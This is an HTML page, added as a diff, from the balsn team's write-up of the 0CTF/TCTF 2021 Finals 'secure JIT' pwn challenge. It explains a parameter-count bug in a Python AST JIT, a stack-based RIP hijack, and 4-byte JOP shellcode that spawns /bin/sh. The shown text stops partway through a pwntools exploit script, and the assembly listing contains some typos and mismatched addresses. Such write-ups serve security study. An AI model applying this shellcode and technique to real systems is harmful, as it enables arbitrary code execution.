@@ -1,0 +1,821 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>0CTF/TCTF 2021 Finals</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#secure-jit">secure-jit</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#how-to-generate">how-to-generate</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#secure-jit" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">secure-jit</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#how-to-generate" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">how-to-generate</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="0ctftctf-2021-finals"><a class="header-link" href="#0ctftctf-2021-finals"></a>0CTF/TCTF 2021 Finals</h1>
+
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="secure-jit"><a class="header-link" href="#secure-jit"></a>secure JIT</h3>
+<h4 id="intro"><a class="header-link" href="#intro"></a>INTRO</h4>
+<p>This is a challenge which use python ast module generate JIT(64 bit), however, author modified code with the origin ast module, and give us the diff result:<code>patch.diff</code>.We could find out that the challenge mmap a executable section, and put the JIT binary inside for execution.</p>
+<h4 id="bug"><a class="header-link" href="#bug"></a>BUG</h4>
+<p>After inspecting codes and several try and error, we find out that there exisit problem in the function for generate functiondef, below is the reference.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">visit_FunctionDef</span>(<span class="hljs-params">self, node</span>):</span>
+    <span class="hljs-keyword">assert</span> self.func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;nested functions not supported&#x27;</span>
+    <span class="hljs-keyword">assert</span> node.args.vararg <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;*args not supported&#x27;</span>
+    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">not</span> node.args.kwonlyargs, <span class="hljs-string">&#x27;keyword-only args not supported&#x27;</span>
+    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">not</span> node.args.kwarg, <span class="hljs-string">&#x27;keyword args not supported&#x27;</span>
+
+    self.func = node.name
+    self.label_num = <span class="hljs-number">1</span>
+    self.<span class="hljs-built_in">locals</span> = {a.arg: i <span class="hljs-keyword">for</span> i, a <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(node.args.args)}
+    <span class="hljs-comment"># Find names of additional locals assigned in this function</span>
+    locals_visitor = LocalsVisitor()
+    locals_visitor.visit(node)
+    <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> locals_visitor.local_names:
+        <span class="hljs-keyword">if</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.<span class="hljs-built_in">locals</span>:
+            self.<span class="hljs-built_in">locals</span>[name] = <span class="hljs-built_in">len</span>(self.<span class="hljs-built_in">locals</span>) + <span class="hljs-number">1</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;array&#x27;</span> <span class="hljs-keyword">in</span> locals_visitor.function_calls:
+        self.<span class="hljs-built_in">locals</span>[<span class="hljs-string">&#x27;_array_size&#x27;</span>] = <span class="hljs-built_in">len</span>(self.<span class="hljs-built_in">locals</span>) + <span class="hljs-number">1</span>
+    self.<span class="hljs-built_in">globals</span> = <span class="hljs-built_in">set</span>(locals_visitor.global_names)
+    self.break_labels = []
+
+    <span class="hljs-comment"># Function label and header</span>
+    self.asm.label(node.name)
+    self.num_extra_locals = <span class="hljs-built_in">len</span>(self.<span class="hljs-built_in">locals</span>) - <span class="hljs-built_in">len</span>(node.args.args)
+    self.compile_enter(self.num_extra_locals)
+
+    <span class="hljs-comment"># Now compile all the statements in the function body</span>
+    <span class="hljs-keyword">for</span> statement <span class="hljs-keyword">in</span> node.body:
+        self.visit(statement)
+
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(node.body[-<span class="hljs-number">1</span>], ast.Return):
+        <span class="hljs-comment"># Function didn&#x27;t have explicit return at the end,</span>
+        <span class="hljs-comment"># compile return now (or exit for &quot;main&quot;)</span>
+        self.compile_return(self.num_extra_locals)
+
+    self.asm.comment(<span class="hljs-string">&#x27;&#x27;</span>)
+    self.func = <span class="hljs-literal">None</span></code></pre><p>In line 9, we could find out that it didn&#39;t check if the function&#39;s parameter is matched with the argument before putting parameters into <code>self.locals</code>. This would cause <strong>arbitrary read/write in stack</strong> when using some statement like assignment or arithmetic operation.</p>
+<h4 id="arbitrary-readwrite-in-stack-to-hijack-rip"><a class="header-link" href="#arbitrary-readwrite-in-stack-to-hijack-rip"></a>Arbitrary read/write in stack to hijack RIP</h4>
+<p>With the arbitrary read/write in stack problem we could hijack RIP now !
+The code below is an example:</p>
+<pre class="hljs"><code><span class="hljs-attribute">test</span>()
+<span class="hljs-attribute">def</span> test():
+    <span class="hljs-attribute">a</span> = <span class="hljs-number">1</span>
+    <span class="hljs-attribute">test1</span>()
+
+<span class="hljs-attribute">def</span> test<span class="hljs-number">1</span>(num<span class="hljs-number">1</span>, num<span class="hljs-number">2</span>, num<span class="hljs-number">3</span>, num<span class="hljs-number">4</span>, num<span class="hljs-number">5</span>):
+    <span class="hljs-attribute">x</span> = <span class="hljs-number">0</span>
+    <span class="hljs-attribute">x</span> = num<span class="hljs-number">1</span>
+    <span class="hljs-attribute">x</span> = num<span class="hljs-number">2</span>
+    <span class="hljs-attribute">x</span> = num<span class="hljs-number">3</span>
+    <span class="hljs-attribute">x</span> = num<span class="hljs-number">4</span>
+    <span class="hljs-attribute">x</span> = num<span class="hljs-number">5</span>
+    <span class="hljs-attribute">num3</span>+=<span class="hljs-number">0</span>x<span class="hljs-number">10</span></code></pre><p>we could imagine the stack diagram when execute to test1()</p>
+<pre class="hljs"><code><span class="hljs-section">|    stack     |  &lt;------- ...
+----------------</span>
+<span class="hljs-section">| RIP(outside) |  &lt;------- num3
+----------------</span>
+<span class="hljs-section">|  0x00000001  |  &lt;------- a, num4
+----------------</span>
+<span class="hljs-section">| rbp(outside) |  &lt;------- num5
+----------------</span>
+<span class="hljs-section">|  rip(test)   |  
+----------------</span>
+<span class="hljs-section">|  0x00000000  |  &lt;------- x
+----------------</span>
+<span class="hljs-section">|  rbp(test)   |
+----------------</span></code></pre><h4 id="jop"><a class="header-link" href="#jop"></a>JOP</h4>
+<p>Now, we could hijack rip, so it&#39;s time to write some shellcode...
+We decide to use <strong>Assignment</strong> to write shellcode.
+So there existed a constraint that <strong>instruction must be lower than 4 bytes</strong>
+Finally we had the following gadget.</p>
+<pre class="hljs"><code>setupJOP()
+
+def setupJOP():
+    overwriteRIP()
+    a = <span class="hljs-number">0x04eb5854</span>  #<span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><span class="hljs-comment">;          pop rax</span>
+    a = <span class="hljs-number">0x682f00c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x686200c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x686900c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x686e00c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x682f00c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x687300c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x686800c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x680000c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04eb5f54</span>  #<span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><span class="hljs-comment">;          pop rdi</span>
+    a = <span class="hljs-number">0x04ebf631</span>  #<span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">esi</span>
+    a = <span class="hljs-number">0x04ebd231</span>  #<span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span>
+    a = <span class="hljs-number">0x04ebc031</span>  #<span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span>
+    a = <span class="hljs-number">0x050f3bb0</span>  #<span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x3b</span><span class="hljs-comment">;      syscall</span>
+
+def overwriteRIP(num1,num2,num3,num4,num5):
+    x = num1
+    x = num2
+    x = num3
+    x = num4
+    x = num5
+    num3+=<span class="hljs-number">0x10</span></code></pre><p>shellcode execution flow :</p>
+<pre class="hljs"><code>&lt;!-- set <span class="hljs-built_in">rax</span> to <span class="hljs-built_in">rsp</span> address --&gt;
+<span class="hljs-number">0x15</span>: <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rsp</span>
+<span class="hljs-number">0x16</span>: <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rax</span>
+<span class="hljs-number">0x17</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x1d</span>
+&lt;!-- <span class="hljs-keyword">mov</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-built_in">rsp</span> address --&gt;
+<span class="hljs-number">0x1d</span>: <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span>[<span class="hljs-built_in">rax</span>],<span class="hljs-number">0x2f</span>
+<span class="hljs-number">0x20</span>: <span class="hljs-keyword">push</span>   <span class="hljs-number">0x6808458f</span>
+<span class="hljs-number">0x25</span>: <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span>
+<span class="hljs-number">0x26</span>: <span class="hljs-keyword">nop</span> 
+<span class="hljs-number">0x27</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x2d</span>
+
+&lt;!-- <span class="hljs-keyword">mov</span> <span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-built_in">rsp</span> address --&gt;
+<span class="hljs-number">0x2d</span>: <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">al</span>
+<span class="hljs-number">0x2f</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x35</span>
+
+<span class="hljs-number">0x35</span>: <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">byte</span>[<span class="hljs-built_in">rax</span>],<span class="hljs-number">0x62</span>
+<span class="hljs-number">0x38</span>: <span class="hljs-keyword">push</span>   <span class="hljs-number">0x6808458f</span>
+<span class="hljs-number">0x3d</span>: <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span>
+<span class="hljs-number">0x3e</span>: <span class="hljs-keyword">nop</span>
+<span class="hljs-number">0x3f</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x45</span>
+
+&lt;!-- <span class="hljs-keyword">mov</span> <span class="hljs-string">&#x27;i&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-built_in">rsp</span> address --&gt;
+<span class="hljs-number">0x45</span>: <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">al</span>
+<span class="hljs-number">0x47</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x4d</span>
+
+<span class="hljs-number">0x4d</span>: <span class="hljs-keyword">mov</span>    pyte <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x69</span> 
+<span class="hljs-number">0x50</span>: <span class="hljs-keyword">push</span>   <span class="hljs-number">0x6808458f</span>
+<span class="hljs-number">0x55</span>: <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span>
+<span class="hljs-number">0x56</span>: <span class="hljs-keyword">nop</span>
+<span class="hljs-number">0x57</span>: <span class="hljs-keyword">jmp</span> <span class="hljs-number">0x5d</span>
+
+&lt;!-- <span class="hljs-keyword">mov</span> <span class="hljs-string">&#x27;n&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-built_in">rsp</span> address --&gt;
+<span class="hljs-number">0x5d</span>: <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">al</span>
+<span class="hljs-number">0x5f</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x65</span>
+
+<span class="hljs-number">0x65</span>: <span class="hljs-keyword">mov</span>    pyte <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x6e</span>
+<span class="hljs-number">0x68</span>: <span class="hljs-keyword">push</span>   <span class="hljs-number">0x6808458f</span>
+<span class="hljs-number">0x6d</span>: <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span>
+<span class="hljs-number">0x6e</span>: <span class="hljs-keyword">nop</span>
+<span class="hljs-number">0x6f</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x75</span>
+
+&lt;!-- <span class="hljs-keyword">mov</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-built_in">rsp</span> address --&gt;
+<span class="hljs-number">0x75</span>: <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">al</span>
+<span class="hljs-number">0x77</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x7d</span>
+
+<span class="hljs-number">0x7d</span>: <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rax</span>],<span class="hljs-number">0x2f</span>
+<span class="hljs-number">0x80</span>: <span class="hljs-keyword">push</span>   <span class="hljs-number">0x6808458f</span>
+<span class="hljs-number">0x85</span>: <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span>
+<span class="hljs-number">0x86</span>: <span class="hljs-keyword">nop</span>
+<span class="hljs-number">0x87</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x8d</span>
+
+&lt;!-- <span class="hljs-keyword">mov</span> <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-built_in">rsp</span> address --&gt;
+<span class="hljs-number">0x8d</span>: <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">al</span>
+<span class="hljs-number">0x8f</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x95</span>
+
+<span class="hljs-number">0x95</span>: <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rax</span>],<span class="hljs-number">0x73</span>
+<span class="hljs-number">0x98</span>: <span class="hljs-keyword">push</span>   <span class="hljs-number">0x6808458f</span>
+<span class="hljs-number">0x9d</span>: <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span>
+<span class="hljs-number">0x9e</span>: <span class="hljs-keyword">nop</span>
+<span class="hljs-number">0x9f</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0xa5</span>
+
+&lt;!-- <span class="hljs-keyword">mov</span> <span class="hljs-string">&#x27;h&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-built_in">rsp</span> address --&gt;
+<span class="hljs-number">0xa5</span>: <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">al</span>
+<span class="hljs-number">0xa7</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x95</span>
+
+<span class="hljs-number">0xad</span>: <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rax</span>],<span class="hljs-number">0x73</span>
+<span class="hljs-number">0xb0</span>: <span class="hljs-keyword">push</span>   <span class="hljs-number">0x6808458f</span>
+<span class="hljs-number">0xb5</span>: <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span>
+<span class="hljs-number">0xb6</span>: <span class="hljs-keyword">nop</span>
+<span class="hljs-number">0xb7</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0xbd</span>
+
+&lt;!-- <span class="hljs-keyword">mov</span> <span class="hljs-string">&#x27;\x00&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-built_in">rsp</span> address --&gt;
+<span class="hljs-number">0xa5</span>: <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">al</span>
+<span class="hljs-number">0xa7</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0xc5</span>
+
+<span class="hljs-number">0xad</span>: <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rax</span>],<span class="hljs-number">0x0</span>
+<span class="hljs-number">0xb0</span>: <span class="hljs-keyword">push</span>   <span class="hljs-number">0x6808458f</span>
+<span class="hljs-number">0xb5</span>: <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span>
+<span class="hljs-number">0xb6</span>: <span class="hljs-keyword">nop</span>
+<span class="hljs-number">0xb7</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0xd5</span>
+
+&lt;!-- <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsp</span> to <span class="hljs-built_in">rdi</span> --&gt;
+<span class="hljs-number">0xd5</span>: <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rsp</span>
+<span class="hljs-number">0xd6</span>: <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span>
+<span class="hljs-number">0xd7</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0xdd</span>
+
+&lt;!-- set <span class="hljs-built_in">esi</span> to <span class="hljs-number">0</span> --&gt;
+<span class="hljs-number">0xdd</span>: <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">esi</span>,<span class="hljs-built_in">esi</span>
+<span class="hljs-number">0xdf</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0xe5</span>
+
+&lt;!-- set <span class="hljs-built_in">edx</span> to <span class="hljs-number">0</span> --&gt;
+<span class="hljs-number">0xe5</span>: <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edx</span>
+<span class="hljs-number">0xe7</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0xed</span>
+
+&lt;!-- set <span class="hljs-built_in">eax</span> to <span class="hljs-number">0x3b</span> --&gt;
+<span class="hljs-number">0xe5</span>: <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>
+<span class="hljs-number">0xe7</span>: <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0xf5</span>
+
+<span class="hljs-number">0xf5</span>: <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x3b</span>
+&lt;!-- <span class="hljs-keyword">syscall</span> --&gt;
+<span class="hljs-number">0xf7</span> <span class="hljs-keyword">syscall</span>
+</code></pre><p>Finally, exploit script:</p>
+<pre class="hljs"><code>from pwn import *
+
+code = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
+setupJOP()
+
+def setupJOP():
+    overwriteRIP()
+    a = <span class="hljs-number">0x04eb5854</span>  #<span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><span class="hljs-comment">;          pop rax</span>
+    a = <span class="hljs-number">0x682f00c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x686200c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
+    a = <span class="hljs-number">0x686900c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
+    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
+    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
